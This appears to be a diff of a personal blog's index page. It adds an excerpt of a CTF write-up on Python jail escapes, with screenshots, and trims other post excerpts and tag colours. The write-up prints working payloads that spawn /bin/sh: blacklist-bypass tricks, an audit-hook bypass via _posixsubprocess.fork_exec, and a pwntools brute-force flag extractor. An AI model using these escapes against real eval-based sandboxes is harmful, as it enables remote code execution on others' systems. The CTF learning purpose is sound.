src="/2022/11/01/pythonJail/level5.1_1.png" alt="level5.1_1"><br><img src="/2022/11/01/pythonJail/level5.1_2.png" alt="level5.1_2"></p>
+<h3 id="LAK3"><a href="#LAK3" class="headerlink" title="LAK3"></a>LAK3</h3><p><img src="/2022/11/01/pythonJail/lak3.png" alt="lak3"></p>
+<h5 id="Same-as-before-we-can-use-the-excate-same-payload-Though-the-official-payload-provides-by-crazyman-is-import-39-sys-39-getframe-1-f-locals-39-right-guesser-question-answer-39"><a href="#Same-as-before-we-can-use-the-excate-same-payload-Though-the-official-payload-provides-by-crazyman-is-import-39-sys-39-getframe-1-f-locals-39-right-guesser-question-answer-39" class="headerlink" title="Same as before, we can use the excate same payload. Though the official payload provides by crazyman is __import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]"></a>Same as before, we can use the excate same payload. Though the official payload provides by crazyman is <code>__import__(&#39;sys&#39;)._getframe(1).f_locals[&#39;right_guesser_question_answer&#39;]</code></h5><h5 id="a-good-blog-can-refer"><a href="#a-good-blog-can-refer" class="headerlink" title="a good blog can refer"></a><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/21982">a good blog can refer</a></h5><h3 id="tyPe-Ch-nnEl"><a href="#tyPe-Ch-nnEl" class="headerlink" title="tyPe Ch@nnEl"></a>tyPe Ch@nnEl</h3><p><img src="/2022/11/01/pythonJail/sideChannel.png" alt="sideChannel"></p>
+<h5 id="I-haven’t-quite-understand-yet-So-I-will-put-the-payload-beforehand"><a href="#I-haven’t-quite-understand-yet-So-I-will-put-the-payload-beforehand" class="headerlink" title="I haven’t quite understand yet. So I will put the payload beforehand:"></a>I haven’t quite understand yet. So I will put the payload beforehand:</h5><h5 id="One-possible"><a href="#One-possible" class="headerlink" title="One possible:"></a>One possible:</h5><pre><code>from pwn import *
+from tqdm import trange
+
+class Gao:
+    def __init__(self):
+        self.known = &#39;&#39;
+
+def init(self):
+    # self.conn = process([&#39;python3&#39;, &#39;./server_type.py&#39;])
+    self.conn = remote(&#39;1.14.71.254&#39;, 28563)
+
+def gao(self):
+    payload = &#39;((1)if(type(flag.split())(flag.encode()).pop(&#123;pos&#125;)^&#123;val&#125;)else(True))&#39;
+    i = len(self.known)
+    while True:
+        for j in trange(32, 128):
+            cur_payload = payload.format(pos=i, val=j)
+            self.init()
+            self.conn.sendlineafter(&#39;Payload:&#39;, cur_payload)
+            s = self.conn.recvline()
+            self.conn.close()
+            if (b&#39;Try&#39; in s):
+                return
+            elif (b&#39;bool&#39; in s):
+                self.known += chr(j)
+                print(self.known)
+                print(self.known)
+                print(self.known)
+                break
+        else:
+            raise Exception(&#39;GG simida&#39;)            
+        i += 1
+if __name__ == &#39;__main__&#39;:
+    g = Gao()
+    g.gao()
+</code></pre>
+<h5 id="↑-Can-took-some-time-when-I-tried"><a href="#↑-Can-took-some-time-when-I-tried" class="headerlink" title="↑ Can took some time(when I tried)"></a>↑ Can took some time(when I tried)</h5><h5 id="Officail"><a href="#Officail" class="headerlink" title="Officail:"></a>Officail:</h5><pre><code>for i in range(len(flag), len(flag)+100): # flag length
+for guess in chars: # all possible chars
+    print(&quot;guess: &quot;, bytes(flag), chr(guess))
+    payload = f&quot;type(type(flag).mro())(type(type(flag).mro())(flag).pop(&#123;i&#125;).encode()).remove(&#123;guess&#125;)&quot;
+</code></pre>
+<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4"></a>LEVEL 4</h3><h6 id="level-4-again"><a href="#level-4-again" class="headerlink" title="level 4 again"></a>level 4 again</h6><p><img src="/2022/11/01/pythonJail/level4_1.png" alt="level4_1"></p>
+<h5 id="Quite-similar-as-before-just-use-bytes-decode-to-pass-the-black-list"><a href="#Quite-similar-as-before-just-use-bytes-decode-to-pass-the-black-list" class="headerlink" title="Quite similar as before, just use bytes().decode() to pass the black list."></a>Quite similar as before, just use <code>bytes().decode()</code> to pass the black list.</h5><p><img src="/2022/11/01/pythonJail/level4wp1.png" alt="level4_1wp1"><br><img src="/2022/11/01/pythonJail/level4wp2.png" alt="level4_1wp2"></p>
+<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()
+</code></pre>
+<h5 id><a href="#" class="headerlink" title></a></h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115, 121, 115, 116, 101, 109]).decode()](bytes([115, 104]).decode())
+</code></pre>
+<h5 id="There-is-another-solution-to-this-problem-I-am-not-sure-I-fully-understand-it-so-I-put-a-link-here-beforehand"><a href="#There-is-another-solution-to-this-problem-I-am-not-sure-I-fully-understand-it-so-I-put-a-link-here-beforehand" class="headerlink" title="There is another solution to this problem: I am not sure I fully understand it, so I put a link here beforehand."></a>There is another solution to this problem: I am not sure I fully understand it, so I put a <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/579057932">link</a> here beforehand.</h5><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])
+</code></pre>
+<p><img src="/2022/11/01/pythonJail/level4wp_3.png" alt="level4wp3"></p>
+<h3 id="LEVEL-4-0-5"><a href="#LEVEL-4-0-5" class="headerlink" title="LEVEL 4.0.5"></a>LEVEL 4.0.5</h3><h5 id="Same-payload-as-last-one"><a href="#Same-payload-as-last-one" class="headerlink" title="Same payload as last one."></a>Same payload as last one.</h5><p><img src="/2022/11/01/pythonJail/level4.0.5.png" alt="level4.0.5"></p>
+<h3 id="LEVEL-4-1"><a href="#LEVEL-4-1" class="headerlink" title="LEVEL 4.1"></a>LEVEL 4.1</h3><h5 id="Quite-same-as-before"><a href="#Quite-same-as-before" class="headerlink" title="Quite same as before."></a>Quite same as before.</h5><p><img src="/2022/11/01/pythonJail/level4.1wp1.png" alt="level4.1"></p>
+<h5 id="Ps-the-bytes-is-now-banned-but-still-you-can-use-show-subclassed-with-tuples-to-replace-like-this"><a href="#Ps-the-bytes-is-now-banned-but-still-you-can-use-show-subclassed-with-tuples-to-replace-like-this" class="headerlink" title="Ps, the bytes is now banned, but still you can use show subclassed with tuples to replace, like this:"></a>Ps, the <code>bytes</code> is now banned, but still you can use <code>show subclassed with tuples</code> to replace, like this:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())
+</code></pre>
+<h3 id="LEVEL-4-2"><a href="#LEVEL-4-2" class="headerlink" title="LEVEL 4.2"></a>LEVEL 4.2</h3><h5 id="Quite-same-as-before-1"><a href="#Quite-same-as-before-1" class="headerlink" title="Quite same as before.."></a>Quite same as before..</h5><p><img src="/2022/11/01/pythonJail/level4.2wp.png" alt="level4.2"></p>
+<h5 id="Or-rather-use-join"><a href="#Or-rather-use-join" class="headerlink" title="Or rather use join:"></a>Or rather use <code>join</code>:</h5><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))
+</code></pre>
+<h3 id="LEVEL-4-3"><a href="#LEVEL-4-3" class="headerlink" title="LEVEL 4.3"></a>LEVEL 4.3</h3><h5 id="Quite-same-as-before…"><a href="#Quite-same-as-before…" class="headerlink" title="Quite same as before…"></a>Quite same as before…</h5><p><img src="/2022/11/01/pythonJail/level4.3wp.png" alt="level4.3"></p>
+<br>
+#### The next few levels are become harder and harder.
+<br>
+
+<h3 id="LEVEL-6"><a href="#LEVEL-6" class="headerlink" title="LEVEL 6"></a>LEVEL 6</h3><h4 id="repetition"><a href="#repetition" class="headerlink" title="repetition:"></a>repetition:</h4><p><img src="/2022/11/01/pythonJail/level6wp1.png" alt="level6wp1"><br><img src="/2022/11/01/pythonJail/level6wp2.png" alt="level6wp2"><br><img src="/2022/11/01/pythonJail/level6wp3.png" alt="level6wp3"></p>
+<h5 id="link-that-may-help-you"><a href="#link-that-may-help-you" class="headerlink" title="link that may help you"></a><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/31883">link that may help you</a></h5><h5 id="The-basic-idea-is-to-RCE-with-posixsubprocess-fork-exec-If-we-import-it-directly-it-will-trigger-the-audit-hook-But-we-can-pass-it-by-using-builtins-39-loader-39-load-module-39-posixsubprocess-39-or-loader-load-module-39-posixsubprocess-39-Also-due-to-its-repeatedly-exct-we-just-shell-like-this"><a href="#The-basic-idea-is-to-RCE-with-posixsubprocess-fork-exec-If-we-import-it-directly-it-will-trigger-the-audit-hook-But-we-can-pass-it-by-using-builtins-39-loader-39-load-module-39-posixsubprocess-39-or-loader-load-module-39-posixsubprocess-39-Also-due-to-its-repeatedly-exct-we-just-shell-like-this" class="headerlink" title="The basic idea is to RCE with _posixsubprocess.fork_exec. If we import it directly, it will trigger the audit hook. But we can pass it by using __builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;) or __loader__.load_module(&#39;_posixsubprocess&#39;). Also, due to its repeatedly exct, we just shell like this:"></a>The basic idea is to RCE with <code>_posixsubprocess.fork_exec</code>. If we import it directly, it will trigger the audit hook. But we can pass it by using <code>__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)</code> or <code>__loader__.load_module(&#39;_posixsubprocess&#39;)</code>. Also, due to its repeatedly exct, we just shell like this:</h5><pre><code>import os
+__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
+</code></pre>
+<h3 id="LEVEL-6-1"><a href="#LEVEL-6-1" class="headerlink" title="LEVEL 6.1"></a>LEVEL 6.1</h3><h5 id="This-time-we-only-got-one-time-to-excute-our-payload-Though-we-our-learning-above-we-know-that-walrus-operator-can-help-us-Also-the-shell-will-shut-immediately-the-blogger-think-of-a-interesting-way-to-overcome-this-by-brute-force-getting-shell-over-and-over-again-and-try-to-input-command-That-works"><a href="#This-time-we-only-got-one-time-to-excute-our-payload-Though-we-our-learning-above-we-know-that-walrus-operator-can-help-us-Also-the-shell-will-shut-immediately-the-blogger-think-of-a-interesting-way-to-overcome-this-by-brute-force-getting-shell-over-and-over-again-and-try-to-input-command-That-works" class="headerlink" title="This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works."></a>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</h5><p><img src="/2022/11/01/pythonJail/level6.1wp.png" alt="level6.1wp"></p>
+<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
+</code></pre>
+<h5 id="or"><a href="#or" class="headerlink" title="or"></a>or</h5><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
+</code></pre>
+<h3 id="SAFEEVAL"><a href="#SAFEEVAL" class="headerlink" title="SAFEEVAL"></a>SAFEEVAL</h3><h5 id="Use-lambda-to-wrap-up-RCE"><a href="#Use-lambda-to-wrap-up-RCE" class="headerlink" title="Use lambda to wrap up RCE"></a>Use lambda to wrap up RCE</h5><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
+</code></pre>
+<p><img src="/2022/11/01/pythonJail/safeeval_1.png" alt="safeeval"><br><img src="/2022/11/01/pythonJail/safeeval_2.png" alt="safeeval"></p>
+<h3 id="LEVEL7"><a href="#LEVEL7" class="headerlink" title="LEVEL7"></a>LEVEL7</h3><h6 id="Come-back-later-to-try-to-figure-it-out…"><a href="#Come-back-later-to-try-to-figure-it-out…" class="headerlink" title="Come back later to try to figure it out…"></a>Come back later to try to figure it out…</h6><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h5><blockquote>
+<p>@exec<br> @input<br> class X: pass</p>
+</blockquote>
+<blockquote>
+<p><strong>import</strong>(‘os’).system(‘sh’)</p>
+</blockquote>
+<h5 id="blog"><a href="#blog" class="headerlink" title="blog"></a><a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5><pre><code>↑# [organizers] Robin_Jadoul solution↑
+</code></pre>
+<p><img src="/2022/11/01/pythonJail/level7wp1.png" alt="level7"><br><img src="/2022/11/01/pythonJail/level7wp2.png" alt="level7"></p>
+<h3 id="Ok-study-for-python-jail-in-NSSCTF-is-over-for-a-while-But-study-for-sandbox-perheps-not-There-are-some-thing-that-may-help-you"><a href="#Ok-study-for-python-jail-in-NSSCTF-is-over-for-a-while-But-study-for-sandbox-perheps-not-There-are-some-thing-that-may-help-you" class="headerlink" title="Ok, study for python jail in NSSCTF is over for a while. But study for sandbox perheps not. There are some thing that may help you:"></a>Ok, study for python jail in NSSCTF is over for a while. But study for sandbox perheps not. There are some thing that may help you:</h3><pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape
+
+https://www.youtube.com/watch?v=Ub_BMOMDOx0
+
+https://zhuanlan.zhihu.com/p/578966149
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/ctf/" style="color: #ff7d73">
+                ctf
+            </a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/jail/" style="color: #ffa2c4">
+                jail
+            </a>
+        </span>
+        
+    </div>
+    <a href="/2022/11/01/pythonJail/" class="go-post">
+        阅读全文
+    </a>
+</div>
+
+<div class="post">
     <a href="/2022/09/26/babymips/">
         <h2>
             Babymips
@@ -180,21 +1034,21 @@
         
         <span class="tag">
             
-            <a href="/tags/ctf/" style="color: #ff7d73">
+            <a href="/tags/ctf/" style="color: #03a9f4">
                 ctf
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/reverse/" style="color: #ff7d73">
+            <a href="/tags/reverse/" style="color: #03a9f4">
                 reverse
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/memo/" style="color: #ff7d73">
+            <a href="/tags/memo/" style="color: #ffa2c4">
                 memo
             </a>
         </span>
@@ -243,14 +1097,14 @@
         
         <span class="tag">
             
-            <a href="/tags/reverse/" style="color: #ffa2c4">
+            <a href="/tags/reverse/" style="color: #ff7d73">
                 reverse
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/tools/" style="color: #00a596">
+            <a href="/tags/tools/" style="color: #03a9f4">
                 tools
             </a>
         </span>
@@ -293,21 +1147,21 @@
         
         <span class="tag">
             
-            <a href="/tags/ctf/" style="color: #00bcd4">
+            <a href="/tags/ctf/" style="color: #00a596">
                 ctf
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/reverse/" style="color: #00bcd4">
+            <a href="/tags/reverse/" style="color: #03a9f4">
                 reverse
             </a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/buuctf/" style="color: #ff7d73">
+            <a href="/tags/buuctf/" style="color: #00bcd4">
                 buuctf
             </a>
         </span>
@@ -358,172 +1212,7 @@
         
         <span class="tag">
             
-            <a href="/tags/codeforces/" style="color: #00bcd4">
-                codeforces
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/c/" style="color: #00bcd4">
-                c++
-            </a>
-        </span>
-        
-    </div>
-    <a href="/2022/09/02/codeforce-817E/" class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-    <a href="/2022/08/29/codeforce-1719C/">
-        <h2>
-            Codeforce-1719C
-        </h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
-            </span>
-            2022/8/29
-        </span>
-    </div>
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            <h1 id="codeforces-1719C"><a href="#codeforces-1719C" class="headerlink" title="codeforces 1719C"></a>codeforces 1719C</h1><h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
-<p>C. Fighting Tournament<br>time limit per test2 seconds<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>Burenka is about to watch the most interesting sporting event of the year — a fighting tournament organized by her friend Tonya.<br>n athletes participate in the tournament, numbered from 1 to n. Burenka determined the strength of the i-th athlete as an integer ai, where 1≤ai≤n. All the strength values are different, that is, the array a is a permutation of length n. We know that in a fight, if ai&gt;aj, then the i-th participant always wins the j-th.<br>The tournament goes like this: initially, all n athletes line up in ascending order of their ids, and then there are infinitely many fighting rounds. In each round there is exactly one fight: the first two people in line come out and fight. The winner goes back to the front of the line, and the loser goes to the back.<br>Burenka decided to ask Tonya q questions. In each question, Burenka asks how many victories the i-th participant gets in the first k rounds of the competition for some given numbers i and k. Tonya is not very good at analytics, so he asks you to help him answer all the questions.</p>
-<blockquote>
-<p>Input<br>The first line contains one integer t (1≤t≤104) — the number of test cases. Description of the test cases follows.<br>The first line of each test case contains two integers n and q (2≤n≤105, 1≤q≤105) — the number of tournament participants and the number of questions.<br>The second line of each test case contains n integers a1,a2,…,an (1≤ai≤n) — the array a, which is a permutation.<br>The next q lines of a test case contain questions. Each line contains two integers i and k (1≤i≤n, 1≤k≤109) — the number of the participant and the number of rounds.<br>It is guaranteed that the sum of n and the sum of q over all test cases do not exceed 105.<br>Output<br>For each Burenka’s question, print a single line containing one integer — the answer to the question.</p>
-</blockquote>
-</blockquote>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/codeforces/" style="color: #00bcd4">
-                codeforces
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/c/" style="color: #ffa2c4">
-                c++
-            </a>
-        </span>
-        
-    </div>
-    <a href="/2022/08/29/codeforce-1719C/" class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-    <a href="/2022/08/28/leetcode剑指offer-04/">
-        <h2>
-            Leetcode剑指offer 04
-        </h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
-            </span>
-            2022/8/28
-        </span>
-    </div>
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            <h3 id="reminder"><a href="#reminder" class="headerlink" title="reminder:"></a>reminder:</h3><p><code>if a list is empty, it will report error&#39;list index out of range&#39;</code></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/reminder/" style="color: #00bcd4">
-                reminder
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/python/" style="color: #03a9f4">
-                python
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/leetcode/" style="color: #00bcd4">
-                leetcode
-            </a>
-        </span>
-        
-    </div>
-    <a href="/2022/08/28/leetcode剑指offer-04/" class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-    <a href="/2022/08/28/codeforce-1720C/">
-        <h2>
-            codeforce:1720C
-        </h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
-            </span>
-            2022/8/28
-        </span>
-    </div>
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            <h1 id="codeforces-1720C"><a href="#codeforces-1720C" class="headerlink" title="codeforces 1720C"></a>codeforces 1720C</h1><h3 id="The-problem"><a href="#The-problem" class="headerlink" title="The problem"></a>The problem</h3><blockquote>
-<p>C. Corners<br>time limit per test1 second<br>memory limit per test256 megabytes<br>inputstandard input<br>outputstandard output<br>You are given a matrix consisting of n rows and m columns. Each cell of this matrix contains 0 or 1.<br>Let’s call a square of size 2×2 without one corner cell an L-shape figure. In one operation you can take one L-shape figure, with at least one cell containing 1 and replace all numbers in it with zeroes.<br>Find the maximum number of operations that you can do with the given matrix.</p>
-<blockquote>
-<p>Input<br>The first line contains one integer t (1≤t≤500) — the number of test cases. Then follow the descriptions of each test case.<br>The first line of each test case contains two integers n and m (2≤n,m≤500) — the size of the matrix.<br>Each of the following n lines contains a binary string of length m — the description of the matrix.<br>It is guaranteed that the sum of n and the sum of m over all test cases does not exceed 1000.<br>Output<br>For each test case output the maximum number of operations you can do with the given matrix.</p>
-</blockquote>
-</blockquote>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/codeforces/" style="color: #00a596">
+            <a href="/tags/codeforces/" style="color: #ffa2c4">
                 codeforces
             </a>
         </span>
@@ -536,115 +1225,7 @@
         </span>
         
     </div>
-    <a href="/2022/08/28/codeforce-1720C/" class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-    <a href="/2022/08/27/arknights-recruit-calculator/">
-        <h2>
-            Arknights Recruit Calculator(1)
-        </h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
-            </span>
-            2022/8/27
-        </span>
-    </div>
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            <h1 id="arknights-recruit-calculator-1"><a href="#arknights-recruit-calculator-1" class="headerlink" title="arknights recruit calculator(1)"></a>arknights recruit calculator(1)</h1><h5 id="Published-2022-x2F-08-x2F-27"><a href="#Published-2022-x2F-08-x2F-27" class="headerlink" title="Published: 2022&#x2F;08&#x2F;27"></a>Published: 2022&#x2F;08&#x2F;27</h5><h5 id="Updated-2022-x2F-08-x2F-27"><a href="#Updated-2022-x2F-08-x2F-27" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;27"></a>Updated: 2022&#x2F;08&#x2F;27</h5><h3 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h3><ul>
-<li>I’m pretty addicted to this game named Arknights these days, and there is this module named “公招”(“recruit” in English or whatever). So there is this calculator tools use to help you recruit what you want on website. One day it the website&#x2F;procedure were been maintained. And I been studying php for couples of days. That’s when I decided to build my own recruit calculator.</li>
-<li>It’s still in testing phase, when it’s complete, I may put it on a website.</li>
-<li>The php function mention below can be consulted on <a target="_blank" rel="noopener" href="https://www.php.net/">php.net</a></li></ul>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/tools/" style="color: #00bcd4">
-                tools
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/php/" style="color: #ff7d73">
-                php
-            </a>
-        </span>
-        
-    </div>
-    <a href="/2022/08/27/arknights-recruit-calculator/" class="go-post">
-        阅读全文
-    </a>
-</div>
-
-<div class="post">
-    <a href="/2022/08/26/基于hexo框架的博客搭建/">
-        <h2>
-            To Build Your Blog on Github
-        </h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
-            </span>
-            2022/8/26
-        </span>
-    </div>
-    <div class="excerpt">
-        <div class="content" v-pre>
-            
-            <h1 id="Build-Blog-with-Hexo-and-GitHub-Pages"><a href="#Build-Blog-with-Hexo-and-GitHub-Pages" class="headerlink" title="Build Blog with Hexo and GitHub Pages"></a>Build Blog with Hexo and GitHub Pages</h1><h5 id="Published-2022-x2F-08-x2F-26"><a href="#Published-2022-x2F-08-x2F-26" class="headerlink" title="Published: 2022&#x2F;08&#x2F;26"></a>Published: 2022&#x2F;08&#x2F;26</h5><h5 id="Updated-2022-x2F-08-x2F-26"><a href="#Updated-2022-x2F-08-x2F-26" class="headerlink" title="Updated: 2022&#x2F;08&#x2F;26"></a>Updated: 2022&#x2F;08&#x2F;26</h5><h2 id="PREFACE"><a href="#PREFACE" class="headerlink" title="PREFACE"></a>PREFACE</h2><h3 id="As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog"><a href="#As-my-very-first-blog-here-I-want-to-record-some-point-and-hope-that-it-will-help-whoever-wants-to-build-his-own-blog" class="headerlink" title="As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog."></a>As my very first blog, here I want to record some point and hope that it will help whoever wants to build his own blog.</h3><h3 id="THE-THINGS-NEED-TO-BE-DONE"><a href="#THE-THINGS-NEED-TO-BE-DONE" class="headerlink" title="THE THINGS NEED TO BE DONE"></a>THE THINGS NEED TO BE DONE</h3>
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/tools/" style="color: #00a596">
-                tools
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/hexo/" style="color: #ffa2c4">
-                hexo
-            </a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/node-js/" style="color: #00a596">
-                node.js
-            </a>
-        </span>
-        
-    </div>
-    <a href="/2022/08/26/基于hexo框架的博客搭建/" class="go-post">
+    <a href="/2022/09/02/codeforce-817E/" class="go-post">
         阅读全文
     </a>
 </div>
@@ -660,8 +1241,24 @@
             1
         </span>
         
+        <span>
+            <a href="/page/2/">
+                <span class="page-num">
+                    2
+                </span>
+            </a>
+            
+            
+        </span>
+        
     </div>
     <div class="next">
+        
+        <a href="/page/2/ ">
+            <span class="page-num">
+                <i class="fa-solid fa-caret-right fa-fw"></i>
+            </span>
+        </a>
         
     </div>
 </div>
